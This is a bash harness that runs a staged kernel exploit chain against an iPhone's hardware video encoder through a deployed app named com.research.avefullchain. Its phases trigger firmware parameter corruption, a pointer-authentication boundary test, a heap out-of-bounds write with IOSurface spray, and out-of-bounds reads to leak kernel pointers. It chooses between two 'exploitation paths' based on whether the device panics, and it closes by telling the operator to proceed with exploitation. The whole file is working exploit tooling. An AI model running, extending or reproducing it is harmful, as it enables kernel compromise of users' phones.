#!/bin/bash
# run_critical_tests.sh — Execute critical test sequence on iPhone Duo
#
# This runs the REVISED test plan (session 15) which gates on the crash_test
# result at encode 198 to determine whether Table 1 entries 592+ are reachable.
#
# Usage: ./run_critical_tests.sh [udid]
# Prerequisites: AVEFullChain must be deployed via deploy_all_probes.sh first.

set -e

UDID="${1:-$(pymobiledevice3 usbmux list --usb 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d[0]['UniqueDeviceID']) if d else sys.exit(1)" 2>/dev/null)}"
if [ -z "$UDID" ]; then echo "ERROR: No USB device. Connect iPhone Duo first."; exit 1; fi

LOG_DIR="$HOME/a20_research/test_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$LOG_DIR"

BUNDLE="com.research.avefullchain"

run_test() {
    local name="$1"
    shift
    local logfile="$LOG_DIR/${name}.txt"
    echo ""
    echo "================================================================"
    echo "  TEST: $name"
    echo "  Args: $@"
    echo "  Log:  $logfile"
    echo "================================================================"
    echo ""

    # Run with timeout (2 minutes per test, kernel panics won't return)
    timeout 120 pymobiledevice3 developer dvt launch "$UDID" "$BUNDLE" "$@" 2>&1 | tee "$logfile"
    local exit_code=${PIPESTATUS[0]}

    if [ $exit_code -eq 124 ]; then
        echo ""
        echo "*** TIMEOUT — possible kernel panic. Wait 30s for reboot. ***"
        echo "TIMEOUT" >> "$logfile"
        sleep 30
        return 1
    elif [ $exit_code -ne 0 ]; then
        echo ""
        echo "*** TEST FAILED with exit code $exit_code ***"
        return 1
    fi

    echo ""
    echo "--- $name completed ---"
    return 0
}

echo "============================================"
echo "  CVE-2026-114025 Critical Test Sequence"
echo "  Device: $UDID"
echo "  Results: $LOG_DIR"
echo "  Time: $(date)"
echo "============================================"

# PHASE 1: MV-HEVC Verification (MUST PASS to continue)
echo ""
echo ">>> PHASE 1: MV-HEVC Support Verification <<<"
if ! run_test "01_mvhevc_verify" "quick"; then
    echo "FATAL: MV-HEVC not supported or first encode failed."
    echo "Cannot continue without MV-HEVC hardware encoder."
    exit 1
fi

# PHASE 2: Cumsum Prediction (measure NAL sizes)
echo ""
echo ">>> PHASE 2: Cumsum Prediction <<<"
run_test "02_cumsum_predict" "cumsum_predict" || true

# PHASE 3: THE GATING TEST — crash_test at encode 198
echo ""
echo ">>> PHASE 3: CRASH TEST at encode 198 (THE GATING TEST) <<<"
echo "This determines whether Table 1 entries 592+ are reachable."
echo "If the firmware memcpy restores +0x5C88 each encode, entries 601+ work."
echo "If not, kernel panics at ~198 encodes."
echo ""

if run_test "03_crash_test" "crash_test" "0x4141"; then
    echo ""
    echo "======================================================="
    echo "  CRASH TEST PASSED — Entries 592+ ARE REACHABLE!"
    echo "  Proceeding with FULL EXPLOITATION PATH (Table 1)"
    echo "======================================================="

    # PHASE 4: BLRAA boundary (213 encodes, just before trigger)
    echo ""
    echo ">>> PHASE 4a: BLRAA Boundary Test (213 encodes) <<<"
    run_test "04a_blraa_boundary" "blraa_boundary" "0x4141" || true

    # PHASE 4b: Firmware param corruption (220 encodes)
    echo ""
    echo ">>> PHASE 4b: Firmware Parameter Corruption <<<"
    run_test "04b_firmware_220" "firmware" "0x4141" "220" || true

    # PHASE 4c: SIMD target test (211 encodes)
    echo ""
    echo ">>> PHASE 4c: SIMD Target (211 encodes, controlled entries 630-633) <<<"
    run_test "04c_simd_target" "simd_target" || true

    # PHASE 5: OOB Read
    echo ""
    echo ">>> PHASE 5: OOB Read (CVE-2026-112465) <<<"
    run_test "05_oob_read" "read_only" || true

    # PHASE 6: Parameter set dump (look for kernel pointers)
    echo ""
    echo ">>> PHASE 6: Parameter Set Dump <<<"
    run_test "06_pset_dump" "pset_dump" "300" || true

else
    echo ""
    echo "======================================================="
    echo "  CRASH TEST FAILED — Table 1 entries 592+ UNREACHABLE"
    echo "  Switching to TABLE 2 EXPLOITATION PATH"
    echo "======================================================="

    # Wait for device to come back after potential panic
    echo "Waiting 60s for device reboot..."
    sleep 60

    # Verify device is back
    echo "Checking device connectivity..."
    pymobiledevice3 usbmux list --usb 2>/dev/null || { echo "Device not back yet. Wait and retry."; exit 1; }

    # PHASE 4-ALT: Safe maximum (196 encodes)
    echo ""
    echo ">>> PHASE 4-ALT: Safe Maximum (196 encodes) <<<"
    run_test "04alt_safe_max" "safe_max" "0x4141" || true

    # PHASE 5-ALT: Table 2 heap test
    echo ""
    echo ">>> PHASE 5-ALT: Table 2 Heap OOB + IOSurface Spray <<<"
    run_test "05alt_table2_heap" "table2_heap" "170" "0x4141" || true

    # PHASE 6-ALT: OOB Read
    echo ""
    echo ">>> PHASE 6-ALT: OOB Read (kernel pointer leak) <<<"
    run_test "06alt_oob_read" "read_only" || true

    # PHASE 7-ALT: Pset dump at safe boundary
    echo ""
    echo ">>> PHASE 7-ALT: Parameter Set Dump (safe boundary) <<<"
    run_test "07alt_pset_dump" "pset_dump" "195" || true
fi

echo ""
echo "============================================"
echo "  All tests complete"
echo "  Results: $LOG_DIR"
echo "  Time: $(date)"
echo "============================================"
echo ""
echo "Next: Review test logs and proceed with exploitation."
echo "Key files to check:"
echo "  03_crash_test.txt — determines which path to take"
echo "  02_cumsum_predict.txt — NAL sizes and cumsum predictions"
